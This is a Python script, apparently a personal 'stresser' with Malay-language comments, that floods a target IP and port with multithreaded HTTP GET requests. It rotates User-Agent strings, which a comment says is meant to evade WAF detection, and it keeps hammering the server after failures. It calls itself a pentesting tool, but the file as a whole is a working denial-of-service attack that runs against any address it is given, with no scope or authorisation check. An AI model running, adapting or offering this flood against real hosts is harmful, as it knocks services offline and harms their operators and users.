#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import threading
import socket
import random
import time
import sys
import argparse

# =================================================================
# PROJECT: KASUZAZ NETWORK STRESSER (KALI EDITION)
# AUTHOR:  kasuzaz
# PURPOSE: Security Testing & Pentesting Portfolio
# USAGE:   python3 stresser.py -t 192.168.1.1 -p 80 -th 500
# =================================================================

def get_args():
    parser = argparse.ArgumentParser(description="KASUZAZ HTTP Flood Stresser for Kali Linux")
    parser.add_argument("-t", "--target", dest="target", help="IP Sasaran (Target IP)", required=True)
    parser.add_argument("-p", "--port", dest="port", type=int, default=80, help="Port (Default: 80)")
    parser.add_argument("-th", "--threads", dest="threads", type=int, default=100, help="Jumlah Threads (Default: 100)")
    return parser.parse_args()

def print_banner():
    banner = f"""
    \033[91m
    ####################################################
    #          KASUZAZ SECURITY TESTING TOOL           #
    #      [ Professional Stresser for Kali Linux ]    #
    ####################################################
    \033[0m
    [*] Author: kasuzaz
    [*] Mode:   HTTP Flood (Layer 7)
    """
    print(banner)

# Statistik Global
request_count = 0
lock = threading.Lock()

def attack(target_ip, target_port):
    global request_count
    # Senarai User-Agent untuk mengelakkan pengesanan mudah (WAF)
    user_agents = [
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "KASUZAZ-SECURITY-BOT/1.1 (Kali-Linux-Testing)"
    ]

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target_ip, target_port))
            
            # Memilih User-Agent secara rawak
            ua = random.choice(user_agents)
            request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {ua}\r\nConnection: keep-alive\r\n\r\n".encode('ascii')
            
            s.sendall(request)
            
            with lock:
                request_count += 1
                if request_count % 100 == 0:
                    print(f"\033[92m[+] [kasuzaz-info] Requests Sent: {request_count}\033[0m", end="\r")
            
            s.close()
        except Exception:
            # Jika server mula "down" atau connection refused
            pass

def main():
    args = get_args()
    print_banner()
    
    print(f"[*] Target IP: {args.target}")
    print(f"[*] Target Port: {args.port}")
    print(f"[*] Threads: {args.threads}")
    print("[!] Memulakan serangan dalam 3 saat... (Ctrl+C untuk berhenti)")
    time.sleep(3)

    threads = []
    for i in range(args.threads):
        t = threading.Thread(target=attack, args=(args.target, args.port))
        t.daemon = True
        threads.append(t)
        t.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n\n\033[93m[!] Ujian dihentikan oleh kasuzaz.\033[0m")
        print(f"[*] Total Requests Dihantar: {request_count}")
        sys.exit()

if __name__ == "__main__":
    main()